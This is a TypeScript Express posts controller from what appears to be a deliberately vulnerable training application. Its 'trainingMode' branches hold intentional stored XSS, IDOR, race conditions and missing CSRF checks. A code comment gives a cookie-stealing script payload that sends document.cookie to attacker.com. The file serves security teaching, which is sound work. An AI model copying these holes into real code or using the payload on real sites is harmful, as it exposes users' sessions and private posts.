import { Request, Response } from 'express';
import sanitizeHtml from 'sanitize-html';
import xss from 'xss';
import { db, rawQuery } from '../config/database';
import { config } from '../config/env';
import { redis } from '../config/redis';
import { logAudit, logSecurityEvent } from '../utils/logger';

// ═══════════════════════════════════════════════════════════════
//                    POSTS CONTROLLER
//
// Vulnerabilities: Stored XSS, IDOR, Race Conditions, Business Logic
// ═══════════════════════════════════════════════════════════════

const SANITIZE_OPTIONS_SECURE = {
  allowedTags: [],
  allowedAttributes: {},
};

const SANITIZE_OPTIONS_VULNERABLE = {
  // ⚠️ VULN: Allows script tags and event handlers
  allowedTags: sanitizeHtml.defaults.allowedTags.concat(['script', 'style', 'iframe']),
  allowedAttributes: {
    '*': ['style', 'onload', 'onerror', 'onclick', 'onmouseover'],
    a: ['href', 'target'],
    img: ['src', 'onerror'],
  },
};

// ─────────────────────────────────────────────
// CREATE POST
//
// ⚠️ VULN #3: Stored XSS
// ─────────────────────────────────────────────
export async function createPost(req: Request, res: Response): Promise<void> {
  const { content, privacy = 'public', mediaUrls = [] } = req.body;
  const userId = req.user!.userId;

  if (!content || content.trim().length === 0) {
    res.status(400).json({ error: 'Post content is required' });
    return;
  }

  let processedContent: string;

  if (config.trainingMode) {
    // ⚠️ VULN #3: Stored XSS
    // Content stored without sanitization — renders as HTML for all viewers
    // Try: <script>fetch('https://attacker.com?cookie='+document.cookie)</script>
    // Try: <img src=x onerror="alert('XSS')">
    // CWE-79: Improper Neutralization of Input During Web Page Generation
    // CVSS: 8.8 (High)
    processedContent = content;  // ⚠️ No sanitization
  } else {
    // 🔒 SECURE: Strip all HTML
    processedContent = sanitizeHtml(content, SANITIZE_OPTIONS_SECURE);
  }

  const [post] = await db('posts').insert({
    user_id: userId,
    content: processedContent,
    media_urls: JSON.stringify(mediaUrls),
    privacy,
    likes_count: 0,
    comments_count: 0,
    shares_count: 0,
    created_at: new Date(),
  }).returning('*');

  // Extract and store hashtags
  const hashtags = content.match(/#[a-zA-Z0-9_]+/g) || [];
  for (const tag of hashtags) {
    await db('hashtags').insert({
      tag: tag.toLowerCase(),
      post_id: post.id,
    }).onConflict(['tag', 'post_id']).ignore();
  }

  logAudit({
    action: 'POST_CREATED',
    userId,
    resourceId: post.id,
    ip: req.ip,
    result: 'success',
  });

  res.status(201).json({ post });
}

// ─────────────────────────────────────────────
// GET POST
//
// ⚠️ VULN #9: IDOR — Access any post by ID
// ─────────────────────────────────────────────
export async function getPost(req: Request, res: Response): Promise<void> {
  const { postId } = req.params;
  const userId = req.user?.userId;

  if (config.trainingMode) {
    // ⚠️ VULN #9: IDOR
    // No privacy check — any authenticated user can access any post
    // including private posts of other users
    // CWE-639: Authorization Bypass Through User-Controlled Key
    const post = await db('posts')
      .join('users', 'posts.user_id', 'users.id')
      .select(
        'posts.*',
        'users.username',
        'users.display_name',
        'users.avatar_url'
      )
      .where('posts.id', postId)
      .first();

    if (!post) {
      res.status(404).json({ error: 'Post not found' });
      return;
    }

    res.json({ post });
  } else {
    // 🔒 SECURE: Check privacy + ownership
    const post = await db('posts')
      .join('users', 'posts.user_id', 'users.id')
      .select('posts.*', 'users.username', 'users.display_name', 'users.avatar_url')
      .where('posts.id', postId)
      .first();

    if (!post) {
      res.status(404).json({ error: 'Post not found' });
      return;
    }

    // Check access
    if (post.privacy === 'private' && post.user_id !== userId) {
      res.status(403).json({ error: 'Access denied' });
      return;
    }

    if (post.privacy === 'followers') {
      const isFollowing = await db('follows')
        .where({ follower_id: userId, following_id: post.user_id })
        .first();
      if (!isFollowing && post.user_id !== userId) {
        res.status(403).json({ error: 'Access denied' });
        return;
      }
    }

    res.json({ post });
  }
}

// ─────────────────────────────────────────────
// LIKE POST
//
// ⚠️ VULN #20: Race Condition on like count
// ⚠️ VULN #21: Business Logic — Like own post, like multiple times
// ─────────────────────────────────────────────
export async function likePost(req: Request, res: Response): Promise<void> {
  const { postId } = req.params;
  const userId = req.user!.userId;

  if (config.trainingMode) {
    // ⚠️ VULN #20: Race Condition
    // No atomic operation — concurrent requests can result in incorrect counts
    // No transaction — non-atomic read-modify-write
    // CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization

    // ⚠️ VULN #21: No duplicate like check
    await db('likes').insert({
      user_id: userId,
      post_id: postId,
      created_at: new Date(),
    });

    // ⚠️ Race condition: read, then update separately
    const post = await db('posts').where({ id: postId }).first();
    await db('posts').where({ id: postId }).update({
      likes_count: post.likes_count + 1,
    });

    res.json({ message: 'Post liked', likesCount: post.likes_count + 1 });
  } else {
    // 🔒 SECURE: Atomic operation + uniqueness constraint
    try {
      await db.transaction(async (trx) => {
        // Insert like (DB unique constraint prevents duplicates)
        await trx('likes').insert({
          user_id: userId,
          post_id: postId,
          created_at: new Date(),
        });

        // 🔒 Atomic increment
        await trx('posts')
          .where({ id: postId })
          .increment('likes_count', 1);
      });

      res.json({ message: 'Post liked' });
    } catch (err: any) {
      if (err.code === '23505') {  // Unique constraint violation
        res.status(409).json({ error: 'Already liked this post' });
      } else {
        throw err;
      }
    }
  }
}

// ─────────────────────────────────────────────
// FEED
// ─────────────────────────────────────────────
export async function getFeed(req: Request, res: Response): Promise<void> {
  const userId = req.user!.userId;
  const { limit = '20', cursor } = req.query;

  // Get IDs of followed users
  const following = await db('follows')
    .where({ follower_id: userId })
    .pluck('following_id');

  // Include own posts
  following.push(userId);

  let query = db('posts')
    .join('users', 'posts.user_id', 'users.id')
    .select(
      'posts.id', 'posts.content', 'posts.media_urls', 'posts.privacy',
      'posts.likes_count', 'posts.comments_count', 'posts.shares_count',
      'posts.created_at', 'posts.user_id',
      'users.username', 'users.display_name', 'users.avatar_url',
      db.raw(`
        EXISTS(SELECT 1 FROM likes WHERE user_id = ? AND post_id = posts.id) as is_liked
      `, [userId]),
      db.raw(`
        EXISTS(SELECT 1 FROM saved_posts WHERE user_id = ? AND post_id = posts.id) as is_saved
      `, [userId])
    )
    .whereIn('posts.user_id', following)
    .where('posts.privacy', '!=', 'private')
    .orderBy('posts.created_at', 'desc')
    .limit(parseInt(limit as string));

  if (cursor) {
    query = query.where('posts.created_at', '<', new Date(cursor as string));
  }

  const posts = await query;

  res.json({
    posts,
    nextCursor: posts.length === parseInt(limit as string)
      ? posts[posts.length - 1].created_at
      : null,
  });
}

// ─────────────────────────────────────────────
// DELETE POST
// ─────────────────────────────────────────────
export async function deletePost(req: Request, res: Response): Promise<void> {
  const { postId } = req.params;
  const userId = req.user!.userId;

  if (config.trainingMode) {
    // ⚠️ VULN #9: IDOR — Delete any user's post
    await db('posts').where({ id: postId }).delete();
    res.json({ message: 'Post deleted' });
  } else {
    // 🔒 SECURE: Verify ownership
    const post = await db('posts').where({ id: postId }).first();
    if (!post) {
      res.status(404).json({ error: 'Post not found' });
      return;
    }

    if (post.user_id !== userId && !['admin', 'moderator'].includes(req.user!.role)) {
      res.status(403).json({ error: 'Access denied' });
      return;
    }

    await db('posts').where({ id: postId }).delete();
    res.json({ message: 'Post deleted' });
  }
}

// ─────────────────────────────────────────────
// GET COMMENTS
// ─────────────────────────────────────────────
export async function getComments(req: Request, res: Response): Promise<void> {
  const { postId } = req.params;

  const comments = await db('comments')
    .join('users', 'comments.user_id', 'users.id')
    .select(
      'comments.id', 'comments.content', 'comments.created_at',
      'comments.likes_count', 'comments.user_id',
      'users.username', 'users.display_name', 'users.avatar_url'
    )
    .where('comments.post_id', postId)
    .orderBy('comments.created_at', 'asc');

  res.json({ comments });
}

// ─────────────────────────────────────────────
// CREATE COMMENT (Stored XSS)
// ─────────────────────────────────────────────
export async function createComment(req: Request, res: Response): Promise<void> {
  const { postId } = req.params;
  const { content } = req.body;
  const userId = req.user!.userId;

  if (!content) {
    res.status(400).json({ error: 'Comment content is required' });
    return;
  }

  let processedContent: string;

  if (config.trainingMode) {
    // ⚠️ VULN #3: Stored XSS in comments
    processedContent = content;
  } else {
    processedContent = sanitizeHtml(content, SANITIZE_OPTIONS_SECURE);
  }

  const [comment] = await db('comments').insert({
    post_id: postId,
    user_id: userId,
    content: processedContent,
    likes_count: 0,
    created_at: new Date(),
  }).returning('*');

  // Increment post comment count
  await db('posts').where({ id: postId }).increment('comments_count', 1);

  res.status(201).json({ comment });
}

// ─────────────────────────────────────────────
// SHARE POST (CSRF + Business Logic)
// ─────────────────────────────────────────────
export async function sharePost(req: Request, res: Response): Promise<void> {
  const { postId } = req.params;
  const userId = req.user!.userId;

  // ⚠️ VULN #6: CSRF — No CSRF token required (in training mode)
  // ⚠️ VULN #21: Business Logic — Can share deleted/private posts

  await db('shares').insert({
    user_id: userId,
    post_id: postId,
    created_at: new Date(),
  });

  await db('posts').where({ id: postId }).increment('shares_count', 1);

  res.json({ message: 'Post shared successfully' });
}
